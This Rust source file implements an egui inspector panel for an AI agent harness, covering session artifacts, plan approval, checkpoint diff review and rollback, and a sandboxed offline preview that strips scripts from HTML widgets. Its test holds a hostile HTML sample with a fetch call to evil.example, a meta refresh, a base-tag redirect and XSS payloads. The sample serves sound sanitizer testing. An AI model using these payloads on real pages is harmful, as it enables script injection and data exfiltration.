use crate::app_state::{DiffsViewMode, GuiState, PromptModal, StageTab};
use crate::backend::BackendHandle;
use crate::icons::Icon;
use crate::markdown::{render_diff, render_markdown, render_vertical_resize_handle};
use crate::theme::{
    badge, copy_to_clipboard, danger_button, empty_state_block, ghost_button, input_frame,
    primary_button, secondary_button, segmented_control, CinderPalette,
};
use harness_store::{FileChangeStatus, PlanStatus};
use harness_tools::GitFileStatus;
use std::sync::Arc;

pub fn render_inspector_view(
    ctx: &egui::Context,
    ui: &mut egui::Ui,
    state: &mut GuiState,
    backend: &Arc<BackendHandle>,
    p: &CinderPalette,
) {
    let Some(snap) = state.snap.clone() else {
        return;
    };
    let Some(sess) = snap.active_session.clone() else {
        return;
    };

    egui::ScrollArea::vertical()
        .id_salt(("inspector_scroll", format!("{:?}", state.stage_tab)))
        .auto_shrink([false, false])
        .show(ui, |ui| match state.stage_tab {
            StageTab::Artifacts => {
                ui.horizontal(|ui| {
                    ui.label(
                        egui::RichText::new("Session artifacts (plans, task lists, notes, widgets)")
                            .small()
                            .color(p.muted),
                    );
                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        if secondary_button(ui, p, "+ New Note").clicked() {
                            state.prompt_modal = PromptModal::NewArtifact {
                                title: String::new(),
                                kind: "report".into(),
                                content: String::new(),
                            };
                        }
                    });
                });
                ui.add_space(8.0);

                if sess.artifacts.is_empty() {
                    if empty_state_block(
                        ui,
                        p,
                        Icon::Blocks,
                        "No session artifacts yet",
                        "Plans, task lists, notes, and interactive reports appear here.",
                        Some("+ New Note"),
                    ) {
                        state.prompt_modal = PromptModal::NewArtifact {
                            title: String::new(),
                            kind: "report".into(),
                            content: String::new(),
                        };
                    }
                } else {
                    let mut execute_plan_sid: Option<String> = None;
                    for art in &sess.artifacts {
                        let can_approve_plan = art.kind == "plan"
                            && sess.active_plan.as_ref().is_some_and(|pl| {
                                pl.status == PlanStatus::AwaitingReview
                                    && (pl.title.eq_ignore_ascii_case(&art.title)
                                        || sess.artifacts.iter().filter(|a| a.kind == "plan").count() == 1)
                            });
                        p.card_frame().show(ui, |ui| {
                            ui.set_width(ui.available_width());
                            ui.horizontal(|ui| {
                                ui.label(egui::RichText::new(&art.title).strong());
                                badge(ui, &art.kind, p.accent_hot, p.accent_soft);
                                ui.with_layout(
                                    egui::Layout::right_to_left(egui::Align::Center),
                                    |ui| {
                                        if can_approve_plan
                                            && primary_button(ui, p, "Approve & Execute").clicked()
                                        {
                                            execute_plan_sid = Some(sess.id.clone());
                                        }
                                        if secondary_button(ui, p, "Delete").clicked() {
                                            backend.delete_artifact(sess.id.clone(), art.id.clone());
                                        }
                                        if secondary_button(ui, p, "Copy").clicked() {
                                            copy_to_clipboard(ctx, &art.content);
                                            state.set_toast("Copied artifact.", false);
                                        }
                                        let is_editing =
                                            state.editing_artifact_id.as_deref() == Some(&art.id);
                                        if secondary_button(
                                            ui,
                                            p,
                                            if is_editing { "Cancel" } else { "Edit" },
                                        )
                                        .clicked()
                                        {
                                            if is_editing {
                                                state.editing_artifact_id = None;
                                            } else {
                                                state.editing_artifact_id = Some(art.id.clone());
                                                state.artifact_edit_buf = art.content.clone();
                                            }
                                        }
                                        if art.kind == "html_widget"
                                            && secondary_button(ui, p, "Preview Safely")
                                                .on_hover_text("Open in browser inside an offline sandbox (scripts & external network disabled)")
                                                .clicked()
                                        {
                                            match write_sandboxed_html_widget_preview(
                                                &art.id,
                                                &art.title,
                                                &art.content,
                                            )
                                            .and_then(|tmp| {
                                                harness_tools::open_with_system_default(&tmp)
                                            }) {
                                                Ok(()) => state.set_toast(
                                                    "Opened sandboxed offline preview.",
                                                    false,
                                                ),
                                                Err(e) => state.set_toast(
                                                    format!("Could not open preview: {e}"),
                                                    true,
                                                ),
                                            }
                                        }
                                    },
                                );
                            });
                            ui.separator();
                            if state.editing_artifact_id.as_deref() == Some(&art.id) {
                                let edit_size_id = ui.make_persistent_id(("art_edit_h", &art.id));
                                let (mut edit_h, mut edit_resized) = ui
                                    .data(|d| d.get_temp::<(f32, bool)>(edit_size_id))
                                    .unwrap_or((220.0, false));
                                edit_h = edit_h.clamp(100.0, 760.0);
                                let line_count = state.artifact_edit_buf.lines().count().max(1);
                                let natural_h = ((line_count as f32 * 18.0) + 18.0).clamp(100.0, 760.0);

                                input_frame(p, false).show(ui, |ui| {
                                    egui::ScrollArea::vertical()
                                        .id_salt(("art_edit_scroll", &art.id))
                                        .min_scrolled_height(edit_h)
                                        .max_height(edit_h)
                                        .show(ui, |ui| {
                                            ui.set_min_height((edit_h - 8.0).max(60.0));
                                            ui.add(
                                                egui::TextEdit::multiline(&mut state.artifact_edit_buf)
                                                    .desired_width(f32::INFINITY)
                                                    .font(egui::TextStyle::Monospace)
                                                    .frame(false),
                                            );
                                        });
                                    render_vertical_resize_handle(
                                        ui,
                                        p,
                                        &mut edit_h,
                                        &mut edit_resized,
                                        220.0,
                                        natural_h,
                                        100.0,
                                        760.0,
                                        ("art_edit_handle", &art.id),
                                    );
                                });
                                ui.data_mut(|d| d.insert_temp(edit_size_id, (edit_h, edit_resized)));
                                ui.add_space(6.0);
                                if primary_button(ui, p, "Save Artifact").clicked() {
                                    let buf = state.artifact_edit_buf.clone();
                                    state.editing_artifact_id = None;
                                    backend.upsert_artifact(
                                        sess.id.clone(),
                                        art.title.clone(),
                                        art.kind.clone(),
                                        buf,
                                    );
                                }
                            } else {
                                ui.push_id(&art.id, |ui| {
                                    render_markdown(ui, p, &art.content, true, None);
                                });
                            }
                        });
                        ui.add_space(8.0);
                    }
                    if let Some(sid) = execute_plan_sid {
                        state.is_generating = true;
                        state.approve_active_plan_optimistically(&sid);
                        backend.plan_action(sid, "execute".into(), None, None);
                    }
                }
            }

            StageTab::Diffs => {
                if state.diffs_view_mode == DiffsViewMode::GitHead
                    && !state.git_diff_loading
                    && state.git_diff_loaded_for_ws != snap.settings.active_workspace_path
                    && snap.git_status.is_repo
                {
                    state.git_diff_loading = true;
                    state.git_diff_loaded_for_ws = snap.settings.active_workspace_path.clone();
                    backend.load_git_diff(state.git_diff_filter.clone());
                }

                ui.horizontal(|ui| {
                    let cp_label = format!("Turn Checkpoints ({})", sess.checkpoints.len());
                    if snap.git_status.is_repo {
                        let git_label =
                            format!("Git vs HEAD ({})", snap.git_status.file_statuses.len());
                        let items = [
                            (DiffsViewMode::Checkpoints, cp_label.as_str()),
                            (DiffsViewMode::GitHead, git_label.as_str()),
                        ];
                        if let Some(next_mode) = segmented_control(
                            ui,
                            p,
                            "diffs_view_mode_seg",
                            state.diffs_view_mode,
                            &items,
                        ) {
                            state.diffs_view_mode = next_mode;
                            if next_mode == DiffsViewMode::GitHead {
                                state.git_diff_loading = true;
                                state.git_diff_loaded_for_ws =
                                    snap.settings.active_workspace_path.clone();
                                backend.load_git_diff(state.git_diff_filter.clone());
                            }
                        }
                    } else {
                        state.diffs_view_mode = DiffsViewMode::Checkpoints;
                        ui.label(egui::RichText::new(cp_label).small().strong().color(p.text));
                    }

                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        if state.diffs_view_mode == DiffsViewMode::GitHead && snap.git_status.is_repo
                        {
                            if secondary_button(ui, p, "Refresh").clicked() {
                                state.git_diff_loading = true;
                                state.git_diff_loaded_for_ws =
                                    snap.settings.active_workspace_path.clone();
                                backend.load_git_diff(state.git_diff_filter.clone());
                            }
                            if state.git_diff_filter.is_some()
                                && ghost_button(ui, p, "Show All").clicked()
                            {
                                state.git_diff_filter = None;
                                state.git_diff_loading = true;
                                state.git_diff_loaded_for_ws =
                                    snap.settings.active_workspace_path.clone();
                                backend.load_git_diff(None);
                            }
                        }
                    });
                });
                ui.add_space(8.0);

                match state.diffs_view_mode {
                    DiffsViewMode::GitHead if snap.git_status.is_repo => {
                        if state.git_diff_loading {
                            ui.horizontal(|ui| {
                                ui.spinner();
                                ui.label(
                                    egui::RichText::new("Computing git diff vs HEAD...")
                                        .small()
                                        .color(p.muted),
                                );
                            });
                        } else if state.git_diff_entries.is_empty() {
                            empty_state_block(
                                ui,
                                p,
                                Icon::FileCode,
                                "Working tree is clean",
                                "No modified, added, or untracked files compared to HEAD.",
                                None,
                            );
                        } else {
                            for entry in &state.git_diff_entries {
                                let scol = match entry.status {
                                    GitFileStatus::Modified => p.amber,
                                    GitFileStatus::Added | GitFileStatus::Untracked => p.green,
                                    GitFileStatus::Deleted | GitFileStatus::Conflicted => p.red,
                                    GitFileStatus::Renamed => p.purple,
                                };
                                p.card_frame().show(ui, |ui| {
                                    ui.set_width(ui.available_width());
                                    ui.horizontal(|ui| {
                                        ui.label(
                                            egui::RichText::new(&entry.rel_path)
                                                .monospace()
                                                .strong(),
                                        );
                                        badge(ui, entry.status.label(), scol, p.bg_card);
                                        ui.with_layout(
                                            egui::Layout::right_to_left(egui::Align::Center),
                                            |ui| {
                                                if entry.status != GitFileStatus::Deleted
                                                    && secondary_button(ui, p, "Open").clicked()
                                                {
                                                    backend.load_workspace_file(
                                                        entry.rel_path.clone(),
                                                    );
                                                }
                                            },
                                        );
                                    });
                                    if !entry.diff.trim().is_empty() {
                                        ui.separator();
                                        render_diff(
                                            ui,
                                            p,
                                            &entry.diff,
                                            &format!("git_head_{}", entry.rel_path),
                                        );
                                    }
                                });
                                ui.add_space(8.0);
                            }
                        }
                    }
                    _ => {
                        if sess.checkpoints.is_empty() {
                            empty_state_block(
                                ui,
                                p,
                                Icon::FileCode,
                                "No workspace changes recorded yet",
                                "File edits made by the agent create reviewable turn checkpoints here.",
                                None,
                            );
                        } else {
                            for cp in sess.checkpoints.iter().rev() {
                                p.card_frame().show(ui, |ui| {
                                    ui.set_width(ui.available_width());
                                    ui.horizontal(|ui| {
                                        ui.label(egui::RichText::new(&cp.title).strong());
                                        badge(
                                            ui,
                                            &format!("{} file(s)", cp.files.len()),
                                            p.muted,
                                            p.bg_card,
                                        );
                                        ui.with_layout(
                                            egui::Layout::right_to_left(egui::Align::Center),
                                            |ui| {
                                                if danger_button(ui, p, "Rollback Turn").clicked() {
                                                    backend.rollback_checkpoint(
                                                        sess.id.clone(),
                                                        cp.id.clone(),
                                                    );
                                                }
                                            },
                                        );
                                    });
                                    ui.separator();
                                    for f in &cp.files {
                                        let scol = match f.status {
                                            FileChangeStatus::Accepted => p.green,
                                            FileChangeStatus::Reverted => p.red,
                                            FileChangeStatus::PendingReview => p.amber,
                                        };
                                        ui.horizontal(|ui| {
                                            ui.label(
                                                egui::RichText::new(&f.rel_path)
                                                    .monospace()
                                                    .strong(),
                                            );
                                            badge(ui, &format!("{:?}", f.status), scol, p.bg_card);
                                            ui.with_layout(
                                                egui::Layout::right_to_left(egui::Align::Center),
                                                |ui| {
                                                    if f.status != FileChangeStatus::Reverted
                                                        && secondary_button(ui, p, "Revert")
                                                            .clicked()
                                                    {
                                                        backend.checkpoint_file_action(
                                                            sess.id.clone(),
                                                            cp.id.clone(),
                                                            f.rel_path.clone(),
                                                            true,
                                                        );
                                                    }
                                                    if f.status != FileChangeStatus::Accepted
                                                        && primary_button(ui, p, "Accept").clicked()
                                                    {
                                                        backend.checkpoint_file_action(
                                                            sess.id.clone(),
                                                            cp.id.clone(),
                                                            f.rel_path.clone(),
                                                            false,
                                                        );
                                                    }
                                                },
                                            );
                                        });
                                        if !f.diff.trim().is_empty() {
                                            render_diff(
                                                ui,
                                                p,
                                                &f.diff,
                                                &format!("{}_{}", cp.id, f.rel_path),
                                            );
                                        }
                                    }
                                });
                                ui.add_space(8.0);
                            }
                        }
                    }
                }
            }

            StageTab::Editor => {}
        });
}

fn sanitize_widget_filename_id(id: &str) -> String {
    let clean: String = id
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_'))
        .take(48)
        .collect();
    if clean.is_empty() {
        "widget".to_string()
    } else {
        clean
    }
}

fn starts_with_tag_name(after_lt: &[u8], tag_lower: &[u8]) -> bool {
    if after_lt.len() < tag_lower.len() {
        return false;
    }
    if !after_lt[..tag_lower.len()]
        .iter()
        .zip(tag_lower.iter())
        .all(|(&a, &b)| a.to_ascii_lowercase() == b)
    {
        return false;
    }
    if after_lt.len() == tag_lower.len() {
        return true;
    }
    let next = after_lt[tag_lower.len()];
    next == b'>' || next == b'/' || next.is_ascii_whitespace()
}

fn find_tag_end(bytes: &[u8], lt_pos: usize) -> usize {
    let mut j = lt_pos + 1;
    let mut quote: Option<u8> = None;
    while j < bytes.len() {
        let b = bytes[j];
        if let Some(q) = quote {
            if b == q {
                quote = None;
            }
        } else if b == b'\'' || b == b'"' {
            quote = Some(b);
        } else if b == b'>' {
            return j + 1;
        }
        j += 1;
    }
    bytes.len()
}

fn find_closing_script_end(bytes: &[u8], start: usize) -> usize {
    const CLOSE: &[u8] = b"</script";
    let mut j = start;
    while j + CLOSE.len() <= bytes.len() {
        if bytes[j..j + CLOSE.len()]
            .iter()
            .zip(CLOSE.iter())
            .all(|(&a, &b)| a.to_ascii_lowercase() == b)
        {
            let after = bytes.get(j + CLOSE.len()).copied();
            if after.is_none_or(|b| b == b'>' || b.is_ascii_whitespace()) {
                return find_tag_end(bytes, j);
            }
        }
        j += 1;
    }
    bytes.len()
}

fn strip_dangerous_html_tags(raw_html: &str) -> String {
    let bytes = raw_html.as_bytes();
    let mut out = String::with_capacity(raw_html.len());
    let mut i = 0usize;

    while i < bytes.len() {
        let Some(rel) = bytes[i..].iter().position(|&b| b == b'<') else {
            out.push_str(&raw_html[i..]);
            break;
        };
        let pos = i + rel;
        out.push_str(&raw_html[i..pos]);

        let after = &bytes[pos + 1..];
        if starts_with_tag_name(after, b"script") {
            let open_end = find_tag_end(bytes, pos);
            i = find_closing_script_end(bytes, open_end);
        } else if starts_with_tag_name(after, b"base") {
            i = find_tag_end(bytes, pos);
        } else if starts_with_tag_name(after, b"meta") {
            let tag_end = find_tag_end(bytes, pos);
            let low = raw_html[pos..tag_end].to_ascii_lowercase();
            if low.contains("http-equiv") && low.contains("refresh") {
                i = tag_end;
            } else {
                out.push('<');
                i = pos + 1;
            }
        } else {
            out.push('<');
            i = pos + 1;
        }
    }

    out
}

fn escape_html_attr(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for ch in s.chars() {
        match ch {
            '&' => out.push_str("&amp;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            _ => out.push(ch),
        }
    }
    out
}

fn escape_html_text(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for ch in s.chars() {
        match ch {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            _ => out.push(ch),
        }
    }
    out
}

fn build_sandboxed_html_widget_document(title: &str, raw_html: &str) -> String {
    const INNER_CSP: &str = "default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; media-src data:; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none';";
    const OUTER_CSP: &str = "default-src 'none'; style-src 'unsafe-inline'; frame-src 'self' data: blob:; base-uri 'none'; form-action 'none'; object-src 'none';";

    let stripped = strip_dangerous_html_tags(raw_html);
    let inner_doc = format!(
        "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\" content=\"{INNER_CSP}\"></head><body>{stripped}</body></html>"
    );
    let escaped_title = escape_html_text(title);
    let escaped_srcdoc = escape_html_attr(&inner_doc);

    format!(
        "<!DOCTYPE html>\n\
<html>\n\
<head>\n\
<meta charset=\"utf-8\">\n\
<meta http-equiv=\"Content-Security-Policy\" content=\"{OUTER_CSP}\">\n\
<title>{escaped_title} — Cinder Sandboxed Offline Preview</title>\n\
<style>\n\
html, body {{ margin: 0; padding: 0; height: 100%; background: #0d0e11; color: #e5e7eb; font-family: system-ui, -apple-system, sans-serif; display: flex; flex-direction: column; }}\n\
.banner {{ padding: 8px 14px; font-size: 12px; background: #181a20; border-bottom: 1px solid #2a2e38; color: #f59e0b; }}\n\
iframe {{ flex: 1; width: 100%; border: 0; background: #ffffff; }}\n\
</style>\n\
</head>\n\
<body>\n\
<div class=\"banner\">Cinder Sandboxed Offline Preview &middot; Scripts &amp; external network access disabled ({escaped_title})</div>\n\
<iframe sandbox=\"\" referrerpolicy=\"no-referrer\" srcdoc=\"{escaped_srcdoc}\"></iframe>\n\
</body>\n\
</html>\n"
    )
}

fn write_sandboxed_html_widget_preview(
    id: &str,
    title: &str,
    raw_html: &str,
) -> anyhow::Result<std::path::PathBuf> {
    let dir = std::env::temp_dir().join("cinder_sandboxed_previews");
    std::fs::create_dir_all(&dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
    }
    let clean_id = sanitize_widget_filename_id(id);
    let tmp = dir.join(format!("cinder_widget_{clean_id}.html"));
    let doc = build_sandboxed_html_widget_document(title, raw_html);
    #[cfg(unix)]
    {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .mode(0o600)
            .open(&tmp)?;
        f.write_all(doc.as_bytes())?;
    }
    #[cfg(not(unix))]
    std::fs::write(&tmp, doc)?;
    Ok(tmp)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sandboxed_html_widget_strips_scripts_refresh_and_enforces_offline_csp() {
        assert_eq!(sanitize_widget_filename_id("../../evil/id?1"), "evilid1");
        assert_eq!(sanitize_widget_filename_id("../.."), "widget");

        let hostile = r#"<html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/"></head><body><h1>Hi — café</h1><SCRIPT type="text/javascript">fetch('https://evil.example/?x=1>2')</script><script>alert(1)</script><p>Safe</p></body></html>"#;
        let doc = build_sandboxed_html_widget_document("<img onerror=alert(1)>", hostile);

        assert!(doc.contains("sandbox=\"\""));
        assert!(doc.contains("referrerpolicy=\"no-referrer\""));
        assert!(doc.contains("script-src &#39;none&#39;"));
        assert!(doc.contains("connect-src &#39;none&#39;"));
        assert!(doc.contains("default-src 'none'; style-src 'unsafe-inline';"));
        assert!(!doc.contains("fetch("));
        assert!(!doc.contains("alert(1)</script>"));
        assert!(!doc.to_ascii_lowercase().contains("<base"));
        assert!(!doc.to_ascii_lowercase().contains("http-equiv=&quot;refresh"));
        assert!(doc.contains("Hi — café"));
        assert!(doc.contains("&lt;img onerror=alert(1)&gt;"));
    }
}
